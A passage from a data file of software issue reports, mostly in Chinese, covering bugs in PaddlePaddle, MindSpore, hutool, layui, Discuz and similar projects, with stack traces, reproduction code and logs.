_count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ format(data_expected[greater], data_me[greater], error[greater])"
引入mybatis plus 公共字段的填充功能，feign调用获取不到用户信息,"pigx版本: 最新版 操作系统: Mac 是否修改包名: 否 public class PigxMetaObjectHandler implements MetaObjectHandler { } 当单应用进行数据库插入和更新操作时能获取到用户信息。 当通过feign调用远程应用更新和插入数据时，获取不到用户信息。 如果把 PigxFeignClientInterceptor文件中 这个判断去除就没有问题。   <code>: /** * 插入元对象字段填充（用于插入时对公共字段的填充） * * @param metaObject 元对象 */ @Override public void insertFill(MetaObject metaObject) { this.setFieldValByName(""createBy"", SecurityUtils.getUser().getId(), metaObject); } /** * 更新元对象字段填充（用于更新时对公共字段的填充） * * @param metaObject 元对象 */ @Override public void updateFill(MetaObject metaObject) { this.setFieldValByName(""updateBy"", SecurityUtils.getUser().getId(), metaObject); } if (CollUtil.isNotEmpty(fromHeader) &amp;&amp; fromHeader.contains(SecurityConstants.FROM_IN)) { return; }"
导出操作时提示异常！！！！,异常: Caused by: java.lang.NoSuchMethodError: org.apache.poi.ss.usermodel.CellStyle.setAlignment(S)V at cn.afterturn.easypoi.excel.export.styler.ExcelExportStylerDefaultImpl.stringNoneStyle(ExcelExportStylerDefaultImpl.java:69) ~[easypoi-base-3.2.0.jar:na] at cn.afterturn.easypoi.excel.export.styler.AbstractExcelExportStyler.createStyles(AbstractExcelExportStyler.java:44) ~[easypoi-base-3.2.0.jar:na] at cn.afterturn.easypoi.excel.export.styler.ExcelExportStylerDefaultImpl.(ExcelExportStylerDefaultImpl.java:31) ~[easypoi-base-3.2.0.jar:na] ... 71 common frames omitted 代码定位在 cn.afterturn.easypoi.excel.export.ExcelExportService 158行   <code>: &lt;dependency&gt; &lt;groupId&gt;cn.afterturn&lt;/groupId&gt; &lt;artifactId&gt;easypoi-base&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.afterturn&lt;/groupId&gt; &lt;artifactId&gt;easypoi-web&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.afterturn&lt;/groupId&gt; &lt;artifactId&gt;easypoi-annotation&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt;
UNSIGNED问题,"先从数据库导入表，表中的字ID字段为BIGINT UNSIGNED类型。 回到工具，在“数据类型”一栏显示如图： 再通过工具导出SQL脚本，然而导出的脚本不能正常执行。脚本生成如下：   <code>: --错误脚本 CREATE TABLE cmf_permissions( id BIGINT UNSIGNED(21) NOT NULL AUTO_INCREMENT COMMENT '' , name VARCHAR(32) NOT NULL COMMENT '权限名称' , url VARCHAR(500) NOT NULL COMMENT '对应的URL' , PRIMARY KEY (id) ) COMMENT = '权限表' --正确的脚本应该是 CREATE TABLE cmf_permissions( id BIGINT(21) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '' , name VARCHAR(32) NOT NULL COMMENT '权限名称' , url VARCHAR(500) NOT NULL COMMENT '对应的URL' , PRIMARY KEY (id) ) COMMENT = '权限表'"
http工具类，url转码返回结果不正确,"JDK版本： openjdk_8_201 hutool版本： 5.3.0 1，同样的url，一个url转码，一个url未转码，使用HttpRequest.get(url)返回的字节码结果不对。 转码的url返回的字节码不正确， 未转码的url返回的字节码正确 同样转码的URl用okhttp3 框架能够正常返回 2，使用HttpUtil.download(url, outputstream)；方法 url转码 直接报404错误，不转码返回结果正确 转码url下载报错信息 Exception in thread ""main"" cn.hutool.http.HttpException: Server response error with status code: [404] at cn.hutool.http.HttpUtil.download(HttpUtil.java:356) at cn.hutool.http.HttpUtil.download(HttpUtil.java:334) at com.qs.saas.business.common.utils.PdfUtils.main(PdfUtils.java:160)   <code>: String url1 = ""http://storage.chancecloud.com.cn/20200413_%E7%B2%A4B12313_386.pdf""; //url转码 String url2 = ""http://storage.chancecloud.com.cn/20200413_粤B12313_386.pdf"";//url未转码 byte[] buffer5 = HttpRequest.get(url1).execute() .bodyBytes(); byte[] buffer6 = HttpRequest.get(url2).execute() .bodyBytes(); // ByteArrayOutputStream os = new ByteArrayOutputStream(); // HttpUtil.download(url1, os, false); // byte[] buffer7 = os.toByteArray(); // os.flush(); ByteArrayOutputStream os2 = new ByteArrayOutputStream(); HttpUtil.download(url2, os2, false); byte[] buffer8 = os2.toByteArray(); os2.flush(); byte[] buffer9 = getBytes(""http://storage.chancecloud.com.cn/20200413_%E7%B2%A4B12313_386.pdf""); private static byte[] getBytes(String url) { Request request = new Request.Builder().url(url)// .get()// .build(); try (Response response = client.newCall(request).execute()) { return response.body().bytes(); } catch (Exception e) { return null; } } private static OkHttpClient client; static { OkHttpClient.Builder builder = new OkHttpClient.Builder() // .connectTimeout(50, TimeUnit.SECONDS) // .writeTimeout(50, TimeUnit.SECONDS) // .readTimeout(50, TimeUnit.SECONDS); // client = builder.build(); }"
PYNATIVE模式multinomial算子内存泄露,"在PYNATIVE模式使用multinomial算子进行计算，出现CPU内存泄露 / 硬件环境: /device GPU/CPU : -- MindSpore version : 1.8.1（pip安装） -- Python version : 3.8.10 -- OS platform and distribution : Ubuntu20.04 -- GCC/Compiler version : (/): /mode pynative 执行上述测试代码，发现打印出来的进程内存占用不断增长 如样例代码的construct函数实现，不管是函数式调用还是均存在此问题 如果使用代替multinomial算子生成一个同样shape的输出，则内存泄露现象消失 此内存泄露在CPU、GPU上均存在，如果切换成GRAPH模式则不会出现 模型循环计算调用过程中，如果输入数据没有明显变化，不应该出现内存增长   <code>: import os import psutil import numpy as np from typing import Tuple import mindspore as ms from mindspore import nn, Tensor, ops # 查询当前进程的内存，单位为MB def get_cpu_memory(pid=os.getpid()): p = psutil.Process(pid) return p.memory_info().rss / (1024 * 1024) class TestNet(nn.Cell): def __init__(self): super(TestNet, self).__init__() self._multinomial = ops.operations.Multinomial(123, 321) # sample from x with shape b*c and generate result with shape b*1 def construct(self, x: Tensor) -&gt; Tuple[Tensor]: # 使用ops.multinomial函数式调用，存在泄露 action = ops.multinomial(x, num_sample=1) # 提前在构造函数创建算子实例，存在泄露 # action = self._multinomial(x, 1) # 使用ops.zeros创建相同大小的输出结果，不会泄露 # action = ops.zeros((x.shape[0], 1), ms.int32) return action def test_mem_leak(): bs = 128 c = 1024 net = TestNet() x = Tensor(np.random.rand(bs, c), ms.float32) # warmup for i in range(50): y = net(x) # 通过转换成numpy矩阵确认计算已经完成 y_arr = y.asnumpy() mem0 = get_cpu_memory() mem1 = 0 for i in range(2000): y = net(x) # 通过转换成numpy矩阵确认计算已经完成 y_arr = y.asnumpy() del y del y_arr mem1 = get_cpu_memory() if (i+1) % 100 == 0: print('Step {}, cpu_mem {}MB -&gt; {}MB'.format(i, mem0, mem1)) print('All done: cpu_mem {}MB -&gt; {}MB'.format(mem0, mem1)) if __name__ == '__main__': ms.context.set_context(device_target='GPU', mode=ms.context.PYNATIVE_MODE) # ms.context.set_context(device_target='GPU', mode=ms.context.GRAPH_MODE) test_mem_leak() # CUDA_VISIBLE_DEVICES=1 python tests/test_mem_leak.py Step 99, cpu_mem 2717.796875MB -&gt; 2717.80078125MB Step 199, cpu_mem 2717.796875MB -&gt; 2717.80859375MB Step 299, cpu_mem 2717.796875MB -&gt; 2717.8125MB Step 399, cpu_mem 2717.796875MB -&gt; 2718.0234375MB Step 499, cpu_mem 2717.796875MB -&gt; 2718.0390625MB Step 599, cpu_mem 2717.796875MB -&gt; 2720.02734375MB Step 699, cpu_mem 2717.796875MB -&gt; 2722.54296875MB Step 799, cpu_mem 2717.796875MB -&gt; 2725.35546875MB Step 899, cpu_mem 2717.796875MB -&gt; 2728.390625MB Step 999, cpu_mem 2717.796875MB -&gt; 2731.19140625MB Step 1099, cpu_mem 2717.796875MB -&gt; 2733.76171875MB Step 1199, cpu_mem 2717.796875MB -&gt; 2736.58203125MB Step 1299, cpu_mem 2717.796875MB -&gt; 2739.4140625MB Step 1399, cpu_mem 2717.796875MB -&gt; 2742.24609375MB Step 1499, cpu_mem 2717.796875MB -&gt; 2744.8125MB Step 1599, cpu_mem 2717.796875MB -&gt; 2747.8984375MB Step 1699, cpu_mem 2717.796875MB -&gt; 2750.47265625MB Step 1799, cpu_mem 2717.796875MB -&gt; 2753.55859375MB Step 1899, cpu_mem 2717.796875MB -&gt; 2756.13671875MB Step 1999, cpu_mem 2717.796875MB -&gt; 2758.91796875MB All done: cpu_mem 2717.796875MB -&gt; 2758.91796875MB ops.multinomial ops.operations.Multinomial ops.zeros"
插件中，官方文档和官方代码对应不起来,官方描述： https://doc.fastadmin.net/developer/79.html 还举了例子： 但是，官方插件example install.sql的实际定义却是：   <code>: 插件数据表名必须以插件标识开始，例如： fa_mydemo_log fa_mydemo_item fa_mydemo_comment 其中mydemo为你的插件标识，fa_为数据表前缀。 CREATE TABLE IF NOT EXISTS `__PREFIX__mydemo_list` ( CREATE TABLE IF NOT EXISTS `__PREFIX__area` ( CREATE TABLE IF NOT EXISTS `__PREFIX__version` (
Simplify the unit testing in the math_function_test. ,The and are used to test the functions in . The former is used to test CPU implementation and the later is used test GPU implementation. There are some duplicated codes.   <code>: math_function_test.cc math_function_test.cu math_function.h
动态图中如何用normal分布来批量sample呢？,"PaddlePaddle版本：1.8.3 cuda 10 cudnn 7.6 我在看parl强化学习算法sac部分代码迁移到动态图中时发现： 上述代码在parl中https://github.com/PaddlePaddle/PARL/blob/develop/parl/algorithms/fluid/sac.py 是可以通过normal分布来批量采集的，但在我动态图模型中，当mean， log_std的shape是[batchsize,1]时，执行到这里会报错。由于调试parl的sac模型发现执行到学习这一步：时无法输出print信息，所以不是很清楚在动态图中该怎么通过normal分布来批量采集？ 再说明下：这里的批量sample意思是---当mean， log_std的shape是[batchsize,1]时，需要从batchsize个normal分布中为每个分布采集一个样本。   <code>: def sample(self, obs): mean, log_std = self.actor(obs) # mean[1,1] obs [1,3] std = layers.exp(log_std) #TODO: why need exp # mean = layers.squeeze(mean, axes=[1]) # std = layers.squeeze(std, axes=[1]) normal = self.distribution(mean, std) # _size = mean.shape[0] output = normal.sample([1]) #output size : [inputSize,1,1] x_t = output[0] y_t = layers.tanh(x_t) action = y_t * self.act_lim log_prob = normal.log_prob(x_t) log_prob -= layers.log(self.act_lim * (1 - layers.pow(y_t, 2)) + epsilon) # log_prob= fluid.layers.unsqueeze(input=log_prob, axes=[1]) log_prob = layers.reduce_sum(log_prob, dim=1, keep_dim=True) log_prob = layers.squeeze(log_prob, axes=[1]) return action, log_prob normal.sample([1]) agent.learn(batch_obs, batch_action, batch_reward, batch_next_obs,batch_terminal)"
关于3.5版本中文件common.js的问题,"使用chrome canary浏览器浏览论坛，浏览器“检查”功能中弹出提示“Audit usage of navigator.userAgent, navigator.appVersion, and navigator.platform”，并且将问题指向common.js文件，经进一步搜索发现，相关提示可能与判断User Agent有关，具体提示内容以及相关文档放在“报错信息”内。 疑似问题重现步骤 使用最新版chrome canary浏览器浏览论坛，然后右键进入“检查”功能，会在“检查”功能右上角收到相关提示。 报错信息 A page or script is accessing at least one of navigator.userAgent, navigator.appVersion, and navigator.platform. In a future version of Chrome, the amount of information available in the User Agent string will be reduced. To fix this issue, replace the usage of navigator.userAgent, navigator.appVersion, and navigator.platform with feature detection, progressive enhancement, or migrate to navigator.userAgentData. Note that for performance reasons, only the first access to one of the properties is shown. AFFECTED RESOURCES 1 source common.js:1 浏览器“检查”功能的进一步提示： 相关文档： https://blog.chromium.org/2021/05/update-on-user-agent-string-reduction.html 为解决问题做过哪些尝试 暂无 版本信息 Discuz! 版本: Discuz! X3.5 Development UTF-8（非正式版） Release 版本: Discuz! X3.5 Development UTF-8（非正式版） 服务器系统版本:Linux / PHP v7.4.20 PHP 版本:7.4.20 MySQL / MariaDB 版本:8.0.25 内存缓存类型和版本:Redis 其他信息 暂无   <code>: 'use strict'; (h=&gt;{ let k; h.rea = k = { globals: window, extend: function(a) { const b = (d,f)=&gt;{ for (const e in d) if (d.hasOwnProperty(e)) { var c = Object.getOwnPropertyDescriptor(d, e); if (c.get) Object.defineProperty(f, e, c); else { c = d[e]; const g = typeof c; ""undefined"" != g &amp;&amp; (null === c ? f[e] = c : ""object"" == g ? (f[e] = f[e] || (Array.isArray(c) ? [] : {}), b(c, f[e])) : f[e] = c) } } } ; b(a, h.rea) } }; h.rea.extend({ page: { reload: function() { window.location.reload() }, eval: function(a) { const b = document.createElementNS(document.lookupNamespaceURI(null) || ""http://www.w3.org/1999/xhtml"", ""script""); b.textContent = a; (document.head || document.body || document.documentElement || document).appendChild(b); b.parentNode.removeChild(b) }, addScript: function(a, b) { const d = document.createElement(""script""); d.setAttribute(""src"", a); b &amp;&amp; (d.onload = ()=&gt;{ b(!0) } , d.onerror = ()=&gt;{ b(!1) } ); (document.head || document.body || document.documentElement || document).appendChild(d) } }, content: { onReady: function(a) { const b = ()=&gt;{ ""prerender"" !== document.webkitVisibilityState &amp;&amp; (document.removeEventListener(""webkitvisibilitychange"", b, !1), a()) } ; ""prerender"" !== document.webkitVisibilityState ? a() : document.addEventListener(""webkitvisibilitychange"", b, !1) } }, runtime: (()=&gt;{ const a = {}; Object.defineProperty(a, ""lastError"", { get: function() { return chrome.runtime.lastError }, enumerable: !0 }); Object.defineProperty(a, ""id"", { get: function() { return chrome.runtime.id }, enumerable: !0 }); Object.defineProperty(a, ""short_id"", { get: function() { return a.id.replace(/[^0-9a-zA-Z]/g, """").substr(0, 4) }, enumerable: !0 }); return a } )(), extension: { inIncognitoContext: chrome.extension.inIncognitoContext, getURL: function(a) { return chrome.runtime.getURL(a) }, sendMessage: function(a, b) { return chrome.runtime.sendMessage(a, b) }, onMessage: { addListener: function(a) { return chrome.runtime.onMessage.addListener(a) } }, connect: function(a) { return chrome.runtime.connect({ name: a }) } } }); h.rea.extend((()=&gt;{ let a = 20 , b = !1 , d = !1; try { b = -1 != navigator.userAgent.indexOf(""Mac OS X"") } catch (c) {} try { a = parseInt(navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./)[2]) } catch (c) {} try { d = -1 != navigator.userAgent.search(/Android|Mobile/) } catch (c) {} const f = { CONSTANTS: { STORAGE: { SCHEMA: ""#schema"", TYPE: ""#storage"", CONFIG: ""#config"", SESSION: ""#session"", VERSION: ""#version"", LEGACY_VERSION: ""TM_version"", LAST_START: ""#laststart"", UPDATE: ""#update"", BEGGING: ""#begging"" }, PREFIX: { SCRIPT_UID: ""@uid#"", COND: ""@re#"", STORE: ""@st#"", SCRIPT: ""@source#"", EXTERNAL: ""@ext#"", META: ""@meta#"" } }, RUNTIME: { BROWSER: ""chrome"", CHROME: !0, MOBILE: d, BROWSER_VERSION: a, FAST_EXEC_SUPPORT: !0, DETECT_CONSTRUCTORS_BY_KEYS: 60 &lt;= a, ALLOWS_FILE_SCHEME_ACCESS: null, MAX_SCRIPTS: 1E3, WEBREQUEST_XHR_SUPPORT: !0, WEBREQUEST_WEBSOCKET: !1, CAN_SAVEAS_ZIP: !0, SHARED_OBJECT_URLS: !0, CONTEXT_MENU: !0, INCOGNITO_MODE: !0 }, ACTIONMENU: { CLOSE_ALLOWED: !0, MIN_DELAY: b ? 150 : 0 }, OPTIONPAGE: { CLOSE_ALLOWED: !1 }, DB: { USE: null, DEFAULT: ""chromeStorage"", SECURE: !1 }, XMLHTTPREQUEST: { RETRIES: 0, PARTIAL_SIZE: 8388608, COOKIE_PASSTHROUGH: !1 }, SCRIPT_DOWNLOAD: { TIMEOUT: 60 }, PINGPONG: { RETRIES: 2 }, MISC: { TIMEOUT: 1, IDLE_TIMEOUT: 15, DISTURBANCE_ALLOWED: 60 }, HTML5: { LOCALSTORAGE: null }, PERMISSIONS: { ALL_URLS: ""&lt;all_urls&gt;"" }, REQUESTS: { HAS_SENDER_ID: !0, INTERNAL_PAGE_PROTOCOLS: [""chrome-extension:""], SENDS_ORIGIN: !0, GET_INTERNAL_PATH_REGEXP: function(c, e) { const g = /(\/|\.|\+|\?|\||\(|\)|\[|\]|\{|\}|\\)/g; return new RegExp((f.REQUESTS.INTERNAL_PAGE_PROTOCOLS[0] + ""//"" + k.runtime.id + ""/"").replace(g, ""\\$1"") + ""([a-zA-Z"" + (c ? ""\\/"" : """") + ""]*)"" + (e || """").replace(g, ""\\$1"")) }, GET_INTERNAL_PAGE_REGEXP: function() { return f.REQUESTS.GET_INTERNAL_PATH_REGEXP(!1, "".html"") } }, OPTIONS: { HAS_CSP: !0, CAN_DOWNLOAD: !0 } }; return { FEATURES: f } } )()) } )(window);"
[ST][MS/modelzoo][NET][naml][Ascend] train.sh include eval code ,"train.sh 不应有推理的内容 / 硬件环境: /device Ascend/ : -- MindSpore version :master commit_id:ad11cdb0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_naml_mindlarge_ascend_train_check_fps_1p_0001 get code from models sh run_train.sh train.sh 里不应包含eval.sh 备注 提给赵婷   <code>: echo ""=============================================================================================================="" echo ""Please run the script as: "" echo ""bash run_train.sh [PLATFORM] [DEVICE_ID] [DATASET] [DATASET_PATH]"" echo ""for example: bash run_train.sh Ascend 0 large /path/MINDlarge"" echo ""It is better to use absolute path."" echo ""=============================================================================================================="" PLATFORM=$1 export RANK_ID=$2 export DEVICE_ID=$2 DATASET=$3 DATASET_PATH=$4 PROJECT_DIR=$(cd ""$(dirname ""$0"")"" || exit; pwd) CHECKPOINT_PATH=""./checkpoint"" config_path=""${PROJECT_DIR}/../MIND${DATASET}_config.yaml"" echo ""config path is : ${config_path}"" python ${PROJECT_DIR}/../train.py \ --config_path=${config_path} \ --platform=${PLATFORM} \ --dataset=${DATASET} \ --dataset_path=${DATASET_PATH} \ --save_checkpoint_path=${CHECKPOINT_PATH} \ --weight_decay=False \ --sink_mode=True python ${PROJECT_DIR}/../eval.py \ --config_path=${config_path} \ --platform=${PLATFORM} \ --dataset=${DATASET} \ --dataset_path=${DATASET_PATH} \ --checkpoint_path=${CHECKPOINT_PATH}/naml_last.ckpt ~ ~ ~ ~ ~ ~ ~ ~ ~ ""run_train.sh"" 49L, 1872C"
弹出层layer中layui-layer-content高度不能自动调节,"代码如下很简单，没什么东西。 具体问题我定位到：layer.js中794行和812行，请确认。   <code>: &lt;!DOCTYPE html&gt; &lt;head&gt; &lt;meta charset=""UTF-8""&gt; &lt;script src=""libraries/jquery.js""&gt;&lt;/script&gt; &lt;link rel=""stylesheet"" type=""text/css"" href=""libraries/layui/css/layui.css""/&gt; &lt;script src=""libraries/layui/layui.js""&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; layui.use(['layer', 'table'], function () { layer.open({ title: '在线调试' ,content: '配置各种参数，试试效果' ,type:1, maxmin: true, area: ['600px','400px'], offset: ['165px', '225px'], closeBtn: 1, resize: true, });}); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; btnHeight = layero.find('.'+doms[6]).outerHeight()"
[CT][MA][SAFE]ModelCoverageMetrics Memory error due to excessive neuron_num value,": /device gpu : -- MindSpore version :binary -- Python version :Python 3.7.5 -- OS platform and distribution :Linux Ubuntu 16.04 -- GCC/Compiler version : na python3 modelcoveragemetrics_fuzz.py class Factory: def init(self, ): pass # in_str = sys.stdin.read() # segmented_num, neuron_num= in_str.strip().split() # self.segmented_num = int(segmented_num) # 10000 # self.neuron_num = int(neuron_num) # 10 python3 modelcoveragemetrics_fuzz.py Traceback (most recent call last): File ""modelcoveragemetrics_fuzz.py"", line 51, in fact.main_function() File ""modelcoveragemetrics_fuzz.py"", line 41, in main_function model_fuzz_test = ModelCoverageMetrics(model=model, segmented_num=10000, neuron_num=10000000000000000, train_dataset=train_images) File ""/root/miniconda3/envs/lp_fz/lib/python3.7/site-packages/mindarmour/fuzzing/model_coverage_metrics.py"", line 63, in init self._lower_bounds = [np.inf]*neuron_num MemoryError no error in test case   <code>: def main_function(self): net = Net() train_images = np.random.random((2, 2)).astype(np.float32) test_images = np.random.random((2, 2)).astype(np.float32) model = Model(net) model_fuzz_test = ModelCoverageMetrics(model=model, segmented_num=10000, neuron_num=10000000000000000, train_dataset=train_images) model_fuzz_test.test_adequacy_coverage_calculate(test_images) kmnc=model_fuzz_test.get_kmnc() nbc = model_fuzz_test.get_nbc() snac = model_fuzz_test.get_snac()"
"[ST][MS][PS]yolov3_darknet53 gpu ps模式下训练失败,但sched保存大量ckpt导致磁盘满","yolov3_darknet53 gpu ps模式下kill 15杀死 scheduler进程后训练失败,但sched仍然保存大量ckpt导致磁盘满 Hardware Environment() / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_fmea_kill15_sched_process_0002.py cd /home/jenkins/workspace/TDT_deployment/solution_test/cases/03subject_test/00reliability_availability/01fault_injection/01business_fault/02process/00process_exit/ms_distribute_framework/ pytest -s test_ms_fmea_kill15_sched_process_0002.py 其他同样问题相关用例： test_ms_fmea_kill15_worker_process_0001.py test_ms_fmea_kill15_sched_and_worker_process_0001.py 训练正常，保存ckpt正常 责任人 周培晨   <code>: -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_48_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_49_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_50_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_51_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_52_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:16 yolov3_5_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_53_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_54_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_55_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_56_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_57_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_58_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_59_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_60_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_61_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_62_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:16 yolov3_6_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_63_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_64_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_65_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_66_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_67_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_68_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_69_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:17 yolov3_70_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_71_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_72_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:16 yolov3_7_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_73_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_74_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_75_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_76_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_77_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_78_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_79_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_80_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_81_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_82_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:16 yolov3_8_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_83_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_84_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_85_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_86_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_87_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_88_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_89_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_90_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_91_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_92_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:16 yolov3_9_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_93_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_94_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_95_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_96_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_97_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_98_2565.ckpt -r-------- 1 jenkins jenkins 499136062 Jun 27 04:18 yolov3_99_2565.ckpt (base) root@:/home/jenkins/workspace/TDT_deployment/solution_test/cases/03subject_test/00reliability_availability/01fault_injection/01business_fault/02process/00process_exit/ms_distribute_framework/test_ms_fmea_kill15_sched_process_0002/scripts"
Invoke operator fill_constant error.,"运行代码出现如下错误 请问是什么问题呢   <code>: W0309 22:57:00.700938 37327 device_context.cc:263] Please NOTE: device: 0, CUDA Capability: 61, Driver API Version: 9.0, Runtime API Version: 9.0 W0309 22:57:00.701022 37327 device_context.cc:271] device: 0, cuDNN Version: 5.0. W0309 22:57:00.701028 37327 device_context.cc:295] WARNING: device: 0. The installed Paddle is compiled with CUDNN 7.3, but CUDNN version in your machine is 5.1, which may cause serious incompatible bug. Please recompile or reinstall Paddle with compatible CUDNN version. Traceback (most recent call last): File ""bin/p_classification/p_train.py"", line 149, in &lt;module&gt; main(conf_dict, use_cuda=use_gpu) File ""bin/p_classification/p_train.py"", line 137, in main train(conf_dict, data_generator, use_cuda=use_cuda) File ""bin/p_classification/p_train.py"", line 122, in train train_loop(fluid.default_main_program()) File ""bin/p_classification/p_train.py"", line 79, in train_loop exe.run(fluid.default_startup_program()) File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 525, in run use_program_cache=use_program_cache) File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 591, in _run exe.run(program.desc, scope, 0, True, True) paddle.fluid.core.EnforceNotMet: Invoke operator fill_constant error. Python Callstacks: File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/framework.py"", line 1382, in _prepend_op attrs=kwargs.get(""attrs"", None)) File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/initializer.py"", line 167, in __call__ stop_gradient=True) File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/framework.py"", line 1198, in create_var kwargs['initializer'](var, self) File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 402, in set_variable_initializer initializer=initializer) File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/layers/tensor.py"", line 137, in create_global_var value=float(value), force_cpu=force_cpu)) File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/optimizer.py"", line 92, in _create_global_learning_rate persistable=True) File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/optimizer.py"", line 224, in _create_optimization_pass self._create_global_learning_rate() File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/optimizer.py"", line 350, in apply_gradients optimize_ops = self._create_optimization_pass(params_grads) File ""/home/xfbai/anaconda3/envs/py2/lib/python2.7/site-packages/paddle/fluid/optimizer.py"", line 405, in minimize optimize_ops = self.apply_gradients(params_grads) File ""bin/p_classification/p_train.py"", line 65, in train sgd_optimizer.minimize(avg_cost) File ""bin/p_classification/p_train.py"", line 137, in main train(conf_dict, data_generator, use_cuda=use_cuda) File ""bin/p_classification/p_train.py"", line 149, in &lt;module&gt; main(conf_dict, use_cuda=use_gpu)"
